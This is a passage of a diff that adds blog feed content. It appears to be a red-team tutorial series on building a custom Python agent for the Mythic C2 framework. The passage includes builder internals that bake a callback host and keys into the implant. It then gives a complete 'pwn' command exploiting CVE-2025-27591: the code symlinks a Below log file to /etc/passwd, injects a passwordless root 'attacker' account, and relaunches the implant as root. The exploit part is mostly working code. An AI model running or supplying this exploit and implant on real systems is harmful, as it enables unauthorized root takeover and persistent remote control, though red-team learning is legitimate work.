+</span></span><span style="display:flex;"><span>    BuildParameter(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https_check&#34;</span>, <span style="color:#f92672">...</span>)
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>These are the options the operator sees when generating a payload from the UI. Three things we&rsquo;re exposing here :</p>
+<ul>
+<li><strong>output</strong> : raw <code>.py</code> or base64 encoded blob</li>
+<li><strong>python_version</strong> : determines which file variant gets picked up at build time</li>
+<li><strong>https_check</strong> : whether to skip TLS verification, useful when working behind a self-signed cert</li>
+</ul>
+<h4 id="path-configuration">Path Configuration</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>agent_path <span style="color:#f92672">=</span> pathlib<span style="color:#f92672">.</span>Path(<span style="color:#e6db74">&#34;.&#34;</span>) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent&#34;</span> <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;mythic&#34;</span>
+</span></span><span style="display:flex;"><span>agent_icon_path <span style="color:#f92672">=</span> agent_path <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent.svg&#34;</span>
+</span></span><span style="display:flex;"><span>agent_code_path <span style="color:#f92672">=</span> pathlib<span style="color:#f92672">.</span>Path(<span style="color:#e6db74">&#34;.&#34;</span>) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent&#34;</span> <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;agent_code&#34;</span>
+</span></span></code></pre></div><p>Nothing fancy here. We&rsquo;re just telling the builder where to find everything. Keeping them relative makes the container portable.</p>
+<h4 id="getpythonversionfile">getPythonVersionFile()</h4>
+<p>A small utility that resolves the right file variant based on the selected Python version. It first looks for a generic <code>.py</code>, then falls back to <code>.py2</code> or <code>.py3</code>. This lets us keep version specific implementations without polluting the main build logic.</p>
+<h4 id="the-transport-template-system">The Transport Template System</h4>
+<p>This is where things get interesting. Instead of hardcoding the HTTP logic directly into the agent, the transport layer is templated and injected at build time. Four methods handle this :</p>
+<ul>
+<li><code>_get_base_code_for_profile()</code> loads the core agent template and the matching transport file for the selected C2 profile</li>
+<li><code>_parse_transport_template()</code> splits the transport file into four named sections using <code>### SECTION ###</code> markers : <code>IMPORTS</code>, <code>CLASS_FIELDS</code>, <code>FUNCTIONS</code>, <code>CONFIG</code></li>
+<li><code>_validate_transport_template_format()</code> makes sure no markers are missing or duplicated</li>
+<li><code>_validate_transport_sections()</code> enforces that <code>FUNCTIONS</code> and <code>CONFIG</code> are non-empty, since those are the bare minimum for a working transport</li>
+</ul>
+<p>The base agent core uses placeholder strings like <code>TRANSPORT_IMPORTS</code>, <code>TRANSPORT_FUNCTIONS</code> and so on, which get swapped out with the parsed sections.</p>
+<p>The nice thing about this design is that adding support for a new C2 profile is as simple as dropping in a new <code>transport_&lt;profile&gt;.py3</code> file. No touching the core agent needed.</p>
+<hr>
+<h4 id="_apply_c2_parameter_replacements">_apply_c2_parameter_replacements()</h4>
+<p>Once the transport is injected, this method does a second pass of string replacements to bake in the actual C2 parameters : callback host, port, URIs, jitter, kill date, the AES PSK and headers.</p>
+<p>Everything gets embedded directly into the final script. No external config file, the implant is fully self-contained.</p>
+<hr>
+<h4 id="the-build-method">The build() Method</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build</span>(self) <span style="color:#f92672">-&gt;</span> BuildResponse:
+</span></span></code></pre></div><p>This is the entry point Mythic calls when generating a payload. The flow goes like this :</p>
+<ol>
+<li>Iterate over registered commands and concatenate their source into one block</li>
+<li>Select the <code>http</code> profile from <code>c2info</code></li>
+<li>Load and assemble the base agent through the transport template system</li>
+<li>Inject the crypto library at <code>CRYPTO_HERE</code></li>
+<li>Replace <code>UUID_HERE</code> with the payload&rsquo;s unique UUID</li>
+<li>Inject commands at <code>#COMMANDS_HERE</code></li>
+<li>Apply all C2 parameter replacements</li>
+<li>Return raw <code>.py</code> or base64 depending on the <code>output</code> build parameter</li>
+</ol>
+<p>If anything breaks along the way, the exception gets caught and handed back to Mythic as a <code>BuildStatus.Error</code> with a descriptive message. On success, we get a clean <code>BuildStatus.Success</code> with the final payload bytes.</p>
+<h2 id="making-our-own-command">Making Our Own Command</h2>
+<p>There&rsquo;s a plethora of commands available online written in any language you&rsquo;d like to use, check out <a href="https://github.com/MythicMeta/MythicContainer">MythicContainer</a> for more information. But for this part, we&rsquo;ll be implementing our own command that leverages CVE-2025-27591 to elevate privileges, read more <a href="https://yassine-elhammoumi.github.io/posts/cve_2025_27591/">here</a>.</p>
+<p>Of course, in this case we&rsquo;ll be using python (there&rsquo;s a <a href="https://red-team-sncf.github.io/how-to-create-your-own-mythic-agent-in-c.html">C tutorial</a> by the ONCF red team that I found informative if you&rsquo;re interested in that).</p>
+<h3 id="command-definition">Command Definition</h3>
+<p>First, you&rsquo;ll need to create a file that defines your command inside the mythic ecosystem, it needs to be inside <code>mythic/agent_functions</code> as specified by the <code>build.py</code> file. I named mine <strong>pwn</strong> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> mythic_container.MythicCommandBase <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> mythic_container.MythicRPC <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PwnArguments</span>(TaskArguments):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, command_line, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>        super()<span style="color:#f92672">.</span>__init__(command_line, <span style="color:#f92672">**</span>kwargs)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>args <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_arguments</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PwnCommand</span>(CommandBase):
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pwn&#34;</span>
+</span></span><span style="display:flex;"><span>    needs_admin <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    help_cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pwn&#34;</span>
+</span></span><span style="display:flex;"><span>    description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;This exploits cve_2025_27591 to elevate privileges&#34;</span>
+</span></span><span style="display:flex;"><span>    version <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    author <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;@Yassine-elhammoumi&#34;</span>
+</span></span><span style="display:flex;"><span>    attackmapping <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;T1068&#34;</span>]
+</span></span><span style="display:flex;"><span>    argument_class <span style="color:#f92672">=</span> PwnArguments
+</span></span><span style="display:flex;"><span>    attributes <span style="color:#f92672">=</span> CommandAttributes(
+</span></span><span style="display:flex;"><span>        supported_python_versions<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;Python 2.7&#34;</span>, <span style="color:#e6db74">&#34;Python 3.8&#34;</span>],
+</span></span><span style="display:flex;"><span>        supported_os<span style="color:#f92672">=</span>[ SupportedOS<span style="color:#f92672">.</span>Linux ]
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_tasking</span>(self, task: MythicTask) <span style="color:#f92672">-&gt;</span> MythicTask:
+</span></span><span style="display:flex;"><span>        task<span style="color:#f92672">.</span>display_params <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CVE-2025-27591&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> MythicRPC()<span style="color:#f92672">.</span>create_message(
+</span></span><span style="display:flex;"><span>            task_id<span style="color:#f92672">=</span>task<span style="color:#f92672">.</span>Task<span style="color:#f92672">.</span>ID,
+</span></span><span style="display:flex;"><span>            message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[i] Attempting privilege escalation via Below (CVE-2025-27591)&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> task
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process_response</span>(self, task: PTTaskMessageAllData, response: any) <span style="color:#f92672">-&gt;</span> PTTaskProcessResponseMessageResponse:
+</span></span><span style="display:flex;"><span>        output <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;output&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> PTTaskProcessResponseMessageResponse(TaskID<span style="color:#f92672">=</span>task<span style="color:#f92672">.</span>Task<span style="color:#f92672">.</span>ID, Success<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        resp<span style="color:#f92672">.</span>UserOutput <span style="color:#f92672">=</span> output
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> resp
+</span></span></code></pre></div><h4 id="pwnarguments">PwnArguments</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PwnArguments</span>(TaskArguments):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, command_line, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>        super()<span style="color:#f92672">.</span>__init__(command_line, <span style="color:#f92672">**</span>kwargs)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>args <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_arguments</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><p>Every command needs an arguments class that extends <code>TaskArguments</code>. Since our exploit doesn&rsquo;t need any input from the operator, we keep <code>self.args</code> empty and leave <code>parse_arguments()</code> as a no-op. Simple as that.</p>
+<h4 id="pwncommand-metadata">PwnCommand Metadata</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PwnCommand</span>(CommandBase):
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pwn&#34;</span>
+</span></span><span style="display:flex;"><span>    needs_admin <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    attackmapping <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;T1068&#34;</span>]
+</span></span><span style="display:flex;"><span>    attributes <span style="color:#f92672">=</span> CommandAttributes(
+</span></span><span style="display:flex;"><span>        supported_python_versions<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;Python 2.7&#34;</span>, <span style="color:#e6db74">&#34;Python 3.8&#34;</span>],
+</span></span><span style="display:flex;"><span>        supported_os<span style="color:#f92672">=</span>[ SupportedOS<span style="color:#f92672">.</span>Linux ]
+</span></span><span style="display:flex;"><span>    )
+</span></span></code></pre></div><p>This is the identity block for our command, similar to what we saw in the builder. A couple things worth noting here :</p>
+<ul>
+<li><code>needs_admin = False</code> since the whole point is to get to admin through the exploit itself</li>
+<li><code>attackmapping = [&quot;T1068&quot;]</code> ties the command to the MITRE ATT&amp;CK technique for exploitation of privilege escalation vulnerabilities</li>
+<li><code>supported_os = [SupportedOS.Linux]</code> restricts the command to Linux only, since CVE-2025-27591 is a Linux specific vulnerability</li>
+</ul>
+<h4 id="create_tasking">create_tasking()</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_tasking</span>(self, task: MythicTask) <span style="color:#f92672">-&gt;</span> MythicTask:
+</span></span><span style="display:flex;"><span>    task<span style="color:#f92672">.</span>display_params <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CVE-2025-27591&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> MythicRPC()<span style="color:#f92672">.</span>create_message(
+</span></span><span style="display:flex;"><span>        task_id<span style="color:#f92672">=</span>task<span style="color:#f92672">.</span>Task<span style="color:#f92672">.</span>ID,
+</span></span><span style="display:flex;"><span>        message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[i] Attempting privilege escalation via Below (CVE-2025-27591)&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> task
+</span></span></code></pre></div><p>This is called by Mythic before the task gets sent down to the implant. We&rsquo;re doing two things here :</p>
+<ul>
+<li>Setting <code>display_params</code> so the operator sees <code>CVE-2025-27591</code> in the task view instead of an empty string</li>
+<li>Pushing an informational message back to the UI so the operator knows the exploit attempt is underway</li>
+</ul>
+<h4 id="process_response">process_response()</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process_response</span>(self, task: PTTaskMessageAllData, response: any) <span style="color:#f92672">-&gt;</span> PTTaskProcessResponseMessageResponse:
+</span></span><span style="display:flex;"><span>    output <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;output&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> PTTaskProcessResponseMessageResponse(TaskID<span style="color:#f92672">=</span>task<span style="color:#f92672">.</span>Task<span style="color:#f92672">.</span>ID, Success<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>UserOutput <span style="color:#f92672">=</span> output
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> resp
+</span></span></code></pre></div><p>This is called once the implant sends back a result. We grab the <code>output</code> field from the response, pack it into a <code>PTTaskProcessResponseMessageResponse</code> and hand it back to Mythic which takes care of displaying it in the UI.</p>
+<p>At this point you should be able to see your command in the command selection step of payload creation.</p>
+
+    <img src="/mythic/first_step/command_select.png"  alt="Image showing the command selection utility"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h3 id="command-implementation">Command Implementation</h3>
+<p>Now that the command has been defined, we&rsquo;ll need to implement it, refer to my <a href="https://yassine-elhammoumi.github.io/posts/cve_2025_27591/">Blog post</a> about the CVE for the code, it needs to be tweaked to fit the mythic standard format. The results are as follows :</p>
+<p><em>note: the file(s) need to exist inside <code>AgentName/agent_code</code> directory (you can have a <code>.py2</code> or <code>.py3</code> or <code>.py</code> according to weather it&rsquo;s supported by only python 2, 3 or both)</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>(self, task_id):
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        B <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/usr/local/bin/below&#34;</span>
+</span></span><span style="display:flex;"><span>        D <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/log/below&#34;</span>
+</span></span><span style="display:flex;"><span>        L <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>D<span style="color:#e6db74">}</span><span style="color:#e6db74">/error_root.log&#34;</span>
+</span></span><span style="display:flex;"><span>        P <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;attacker::0:0:attacker:/root:/bin/bash</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        output <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>geteuid() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[+] Already root&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Current UID: </span><span style="color:#e6db74">{</span>os<span style="color:#f92672">.</span>geteuid()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- check vuln ---</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(D):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[-] /var/log/below not found&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (os<span style="color:#f92672">.</span>stat(D)<span style="color:#f92672">.</span>st_mode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0o002</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[-] Directory not writable&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] Target vulnerable&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- symlink ---</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(L):
+</span></span><span style="display:flex;"><span>                    os<span style="color:#f92672">.</span>remove(L)
+</span></span><span style="display:flex;"><span>                os<span style="color:#f92672">.</span>symlink(<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>, L)
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] Symlink placed&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Symlink failed: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- trigger ---</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74">&#34;sudo&#34;</span>, B, <span style="color:#e6db74">&#34;record&#34;</span>], timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>)
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] Trigger executed&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Trigger error (continuing): </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- inject ---</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> open(L, <span style="color:#e6db74">&#34;a&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>                    f<span style="color:#f92672">.</span>write(P)
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] User injected&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Injection failed: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- verify ---</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;attacker:&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>read():
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[-] Exploit failed (user not present)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] Verified attacker user&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- spawn ROOT agent ---</span>
+</span></span><span style="display:flex;"><span>            agent_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                subprocess<span style="color:#f92672">.</span>Popen(
+</span></span><span style="display:flex;"><span>                    [
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;su&#34;</span>, <span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">&#34;attacker&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;nohup python3 </span><span style="color:#e6db74">{</span>agent_path<span style="color:#e6db74">}</span><span style="color:#e6db74"> &gt;/dev/null 2&gt;&amp;1 &amp;&#34;</span>
+</span></span><span style="display:flex;"><span>                    ]
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] Root agent launched (background)&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Failed to launch root agent: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[*] Wait for new callback in Mythic&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(output)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[FATAL] </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>The indent isn&rsquo;t a mistake, make sure to have it indented in such a way because of how the builder functions.</p>
+<p>I won&rsquo;t break down this code, you can read my other post to understand what&rsquo;s happening and why. The main change here is instead of spawning a root shell, we make a new privileged callback.</p>
+
+    <img src="/mythic/first_step/demo.gif"  alt="gif of the pwn command"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h2 id="final-thoughts">Final Thoughts</h2>
+<p>You can customize basically everything, this blog post is only the tip of the iceberg. Make sure to check out the rest of the series to learn about mythic architecture.</p>
+<p>This was very fun.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Getting Started with Mythic C2: Installation, Configuration, and First Callback</title>
+            <link>/posts/install_mythic/</link>
+            <pubDate>Wed, 01 Apr 2026 10:38:53 +0100</pubDate>
+            
+            <guid>/posts/install_mythic/</guid>
+            <description>This is Part 1 of a series on Mythic C2.
+As an offensive cybersecurity professional, learning about C2 frameworks feels essential. I spent some time researching different options and narrowed it down to two popular open source projects: Mythic and Sliver. Both are widely used in red team and adversary emulation work, but I chose Mythic because of its modular architecture and flexibility. Mythic separates agents and communication profiles into individual components that can be dynamically installed and extended, which felt like a good platform for learning and experimentation.</description>
+            <content type="html"><![CDATA[<blockquote>
+<p>This is Part 1 of a series on Mythic C2.</p>
+</blockquote>
+<p>As an offensive cybersecurity professional, learning about C2 frameworks feels essential. I spent some time researching different options and narrowed it down to two popular open source projects: <a href="https://docs.mythic-c2.net/home">Mythic</a> and <a href="https://sliver.sh/">Sliver</a>. Both are widely used in red team and adversary emulation work, but I chose Mythic because of its modular architecture and flexibility. Mythic separates agents and communication profiles into individual components that can be dynamically installed and extended, which felt like a good platform for learning and experimentation. It was not overly simple to set up but also not too difficult, making it a good balance for my research and learning goals.</p>
+<h2 id="what-youll-learn">What you&rsquo;ll learn</h2>
+<p>In this post, you will:</p>
+<ul>
+<li>Install Mythic from scratch</li>
+<li>Configure your first C2 profile</li>
+<li>Generate a payload</li>
+<li>Receive your first callback</li>
+</ul>
+<h2 id="what-is-mythic">What is Mythic</h2>
+<blockquote>
+<p>Mythic is a multiplayer, command and control platform for red teaming operations. It is designed to facilitate a plug-n-play architecture where new agents, communication channels, and modifications can happen on the fly. Some of the Mythic project’s main goals are to provide quality of life improvements to operators, improve maintainability of agents, enable customizations, and provide more robust data analytic capabilities to operations.</p>
+</blockquote>
+<blockquote>
+<p>Fundamentally, Mythic uses a web-based front end (React) and Docker containers for the back-end. A GoLang server handles the bulk of the web requests via GraphQL APIs and WebSockets. This server then handles connections to the PostgreSQL database and communicates to the other Docker containers via RabbitMQ. This enables the individual components to be on separate physical computers or in different virtual machines if desired.</p>
+</blockquote>
+<p><em>source : <a href="https://docs.mythic-c2.net/home#what-is-mythic">https://docs.mythic-c2.net/home#what-is-mythic</a></em></p>
+<p>This post basically covers the first steps of the Mythic setup, I&rsquo;ll showcase the installation process and test things out with a simple callback.</p>
+<p>Mythic is designed to be modular, so it uses docker containers a web‑based UI, and a controller backend, which allows operators to dynamically install and configure agents and communication channels for different environments and protocols.</p>
